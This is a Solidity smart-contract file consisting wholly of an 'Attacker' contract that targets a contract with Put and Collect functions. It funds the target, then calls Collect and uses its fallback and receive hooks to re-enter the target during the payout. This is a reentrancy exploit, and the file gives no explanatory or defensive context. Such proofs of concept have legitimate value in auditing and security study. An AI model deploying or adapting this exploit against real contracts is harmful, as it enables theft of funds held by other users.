contract Attacker {
    C c;
    uint256 attackAmount;
    constructor(C _c) { c = _c; }
    function fund(uint256 value) external payable {
        // forward value via low-level call to Put
        (bool ok,) = address(c).call{value: value}(abi.encodeWithSignature("Put(uint256)", uint256(0)));
        require(ok);
    }
    function attack(uint256 _collectAmount) external {
        attackAmount = _collectAmount;
        // re-enter through Fallback triggered by Collect's low-level call
        c.Collect(_collectAmount);
    }
    fallback() external payable {
        if (attackAmount > 0) {
            // re-entrant call: Put(0) with no extra value
            c.Put(0);
        }
    }
    receive() external payable {
        if (attackAmount > 0) {
            c.Put(0);
        }
    }
}

